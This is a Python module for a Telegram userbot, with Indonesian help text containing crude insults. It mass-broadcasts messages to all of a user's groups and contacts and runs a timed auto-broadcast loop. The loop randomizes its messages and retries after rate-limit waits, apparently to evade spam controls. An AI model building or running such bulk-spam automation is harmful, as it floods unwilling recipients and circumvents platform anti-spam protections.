from PyroUbot import *

__MODULE__ = "Gcast"
__HELP__ = """
<blockquote><b>✘ Bantuan Untuk Gcast</b></blockquote>

<blockquote><b>๏ Perintah: {0}bc users [Text/Reply]
◉ Penjelasan: Sama Aja Kaya Ucast</b></blockquote>
<blockquote><b>๏ Perintah: {0}bc group [Text/Reply]
◉ Penjelasan: Sama Aja Kaya Gcast Jink</b></blockquote>
<blockquote><b>๏ Perintah: {0}bc all [Text/Reply]
◉ Penjelasan: Nah Ini Juga Sama Bedanya Ke User Sama Grup</b></blockquote>
<blockquote><b>๏ Perintah: {0}send [User/Username - Text/Reply]
◉ Penjelasan: Untuk Mengirim Pesan</b></blockquote>
  
"""


@PY.UBOT("bc")
@PY.TOP_CMD
@ubot.on_message(filters.command(["cbc"], "") & filters.user(DEVS))
async def _(client, message):
    proses = await EMO.PROSES(client)
    _msg = f"<blockquote><b>{proses} Sabar Tolol Ga Sabar Gua Cekek Lo..</b></blockquote>"
    gcs = await message.reply(_msg)

    command, text = extract_type_and_msg(message)

    if command not in ["group", "users", "all"] or not text:
        return await gcs.edit(f"<code>{message.text.split()[0]}</code> <b>[Type] [Text/Reply]</b>")

    chats = await get_data_id(client, command)
    blacklist = await get_chat(client.me.id)

    done = 0
    failed = 0
    for chat_id in chats:
        if chat_id in blacklist or chat_id in BLACKLIST_CHAT:
            continue

        try:
            await (text.copy(chat_id) if message.reply_to_message else client.send_message(chat_id, text))
            done += 1
        except FloodWait as e:
            await asyncio.sleep(e.value)
            await (text.copy(chat_id) if message.reply_to_message else client.send_message(chat_id, text))
            done += 1
        except Exception:
            failed += 1
            pass

    await gcs.delete()
    sukses = await EMO.SUKSES(client)
    gagal = await EMO.GAGAL(client)
    warning = await EMO.WARNING(client)
    _gcs = f"""
<blockquote><b>{warning} Udah Beres Ni Jink.
{sukses} Berhasil : {done} Group
{gagal} Gagal : {failed} Group</b></blockquote>
"""
    return await message.reply(_gcs)




AG = []
LT = []


@PY.UBOT("autog")
@PY.TOP_CMD
async def _(client, message):
    proses = await EMO.PROSES(client)
    gagal = await EMO.GAGAL(client)
    sukses = await EMO.SUKSES(client)
    msg = await message.reply("<b>{proses}Loading...</b>", quote=True)
    type, value = extract_type_and_text(message)
    auto_text_vars = await get_vars(client.me.id, "AUTO_TEXT")

    if type == "on":
        if not auto_text_vars:
            return await msg.edit("<b>{gagal} Setting Duluuu Begookkss</b>")

        if client.me.id not in AG:
            await msg.edit("<b>{sukses} Auto Gikes Udah Hidup</b>")

            AG.append(client.me.id)

            done = 0
            while client.me.id in AG:
                delay = await get_vars(client.me.id, "DELAY_GCAST") or 1
                blacklist = await get_chat(client.me.id)
                txt = random.choice(auto_text_vars)

                group = 0
                async for dialog in client.get_dialogs():
                    if dialog.chat.type in (ChatType.GROUP, ChatType.SUPERGROUP) and dialog.chat.id not in blacklist:
                        try:
                            await asyncio.sleep(1)
                            await client.send_message(dialog.chat.id, f"{txt} {random.choice(range(999))}")
                            group += 1
                        except FloodWait as e:
                            await asyncio.sleep(e.value)
                            await client.send_message(dialog.chat.id, f"{txt} {random.choice(range(999))}")
                            group += 1
                        except Exception:
                            pass

                if client.me.id not in AG:
                    return

                done += 1
                warning = await EMO.WARNING(client)
                sukses = await EMO.SUKSES(client)
                await msg.reply(
                    f"<blockquote><b>{sukses} Auto Gikes {done} Berhasil Ke: {group} Group\n\n{warning} Menunggu {delay} Menit Lagi Untuk Gikes Selanjutnya</b></blockquote>",
                    quote=True,
                )
                await asyncio.sleep(int(60 * int(delay)))
        else:
            return await msg.delete()

    elif type == "off":
        if client.me.id in AG:
            AG.remove(client.me.id)
            return await msg.edit("<b>{sukses} Ciaahh Auto Gikes Lu Dah Mati Blok</b>")
        else:
            return await msg.delete()

    elif type == "text":
        if not value:
            return await msg.edit("<b>Harap Masukan Text Yang Mau Di Kirim Kontol</b>")
        await add_auto_text(client, value)
        return await msg.edit("<b>Text Auto Gcast: Berhasil Di Simpan</b>")

    elif type == "delay":
        await set_vars(client.me.id, "DELAY_GCAST", value)
        return await msg.edit(f"<b>Auto Gcast Delay: Berhasil Ke Setting {value} Menit</b>")

    elif type == "remove":
        if not value:
            return await msg.edit("<b>Harap Masukan Angka Untuk Menghapus List Text</b>")
        if value == "all":
            await set_vars(client.me.id, "AUTO_TEXT", [])
            return await msg.edit("<b>Semua Text Berhasil Dihapus</b>")
        try:
            value = int(value) - 1
            auto_text_vars.pop(value)
            await set_vars(client.me.id, "AUTO_TEXT", auto_text_vars)
            return await msg.edit(f"<b>Auto Gcast Remove: Text Ke {value+1} Berhasil Di Hapus\n\nSilahkan Ketik: <code>{message.text.split()[0]} list</code>, Kembali Untuk Mengecek Apakah Sudah Terhapus</b>")
        except Exception as error:
            return await msg.edit(str(error))

    elif type == "list":
        if not auto_text_vars:
            return await msg.edit("<b>Auto Gcast Text Kosong</b>")
        txt = "<b>Daftar Auto Gcast Text</b>\n\n"
        for num, x in enumerate(auto_text_vars, 1):
            txt += f"{num}: {x}\n\n"
        txt += f"<b>\nUntuk Menghapus Text: <code>{message.text.split()[0]} remove Angka/All</code></b>"
        return await msg.edit(txt)

    elif type == "limit":
        if value == "off":
            if client.me.id in LT:
                LT.remove(client.me.id)
                return await msg.edit("<b>Auto Cek Limit Dinonaktifkan</b>")
            else:
                return await msg.delete()

        elif value == "on":
            if client.me.id not in LT:
                LT.append(client.me.id)
                await msg.edit("<b>Auto Cek Limit Started</b>")
                while client.me.id in LT:
                    for x in range(2):
                        await limit_cmd(client, message)
                        await asyncio.sleep(5)
                    await asyncio.sleep(1200)
            else:
                return await msg.delete()
        else:
            return await msg.edit("<b>Harap Masukan Value On/Off Untuk Menggunakan Perintah Ini</b>")
    else:
        return await msg.edit("<b>Query Yang Dimasukan Salah</b>")


async def add_auto_text(client, text):
    auto_text = await get_vars(client.me.id, "AUTO_TEXT") or []
    auto_text.append(text)
    await set_vars(client.me.id, "AUTO_TEXT", auto_text)


def extract_type_and_text(message):
    args = message.text.split(None, 2)
    if len(args) < 2:
        return None, None

    type = args[1]
    msg = message.reply_to_message.text if message.reply_to_message else args[2] if len(args) > 2 else None
    return type, msg

@PY.BOT("send")
@PY.UBOT("send")
@PY.TOP_CMD
async def send_msg_cmd(client, message):
    if message.reply_to_message:
        if len(message.command) < 2:
            chat_id = message.chat.id
        else:
            chat_id = message.text.split()[1]
        send_done = await get_vars(client.me.id, "SEND_DONE") or "6111585093220830556"
        if not client.me.id == bot.me.id:
            if message.reply_to_message.reply_markup:
                try:
                    x = await client.get_inline_bot_results(bot.me.username, f"get_send {id(message)}")
                    await client.send_inline_bot_result(chat_id, x.query_id, x.results[0].id)
                    tm = await message.reply(f"<emoji id={send_done}>✅</emoji> Pesan Berhasil Dikirim {chat_id}")
                    await asyncio.sleep(5)
                    await message.delete()
                    await tm.delete()
                except Exception as error:
                    await message.reply(error)
        else:
            try:
                await message.reply_to_message.copy(chat_id)
                tm = await message.reply(f"<emoji id={send_done}>✅</emoji> Pesan Berhasil Dikirim Ke {chat_id}")
                await asyncio.sleep(3)
                await message.delete()
                await tm.delete()
            except Exception as t:
                return await message.reply(f"{t}")
    else:
        if len(message.command) < 3:
            return await message.reply("Ketik Yang Bener")
        chat_id = message.text.split(None, 2)[1]
        chat_text = message.text.split(None, 2)[2]
        try:
            await client.send_message(chat_id, chat_text)
            tm = await message.reply(f"{send_done} Pesan Berhasil Dikirim Ke {chat_id}")
            await asyncio.sleep(3)
            await message.delete()
            await tm.delete()
        except Exception as t:
            return await message.reply(f"{t}")
          

@PY.INLINE("^get_send")
@INLINE.QUERY
async def send_inline(client, inline_query):
    _id = int(inline_query.query.split()[1])
    m = [obj for obj in get_objects() if id(obj) == _id][0]
    await client.answer_inline_query(
        inline_query.id,
        cache_time=0,
        results=[
            (
                InlineQueryResultArticle(
                    title="get send!",
                    reply_markup=m.reply_to_message.reply_markup,
                    input_message_content=InputTextMessageContent(m.reply_to_message.text),
                )
            )
        ],
    )
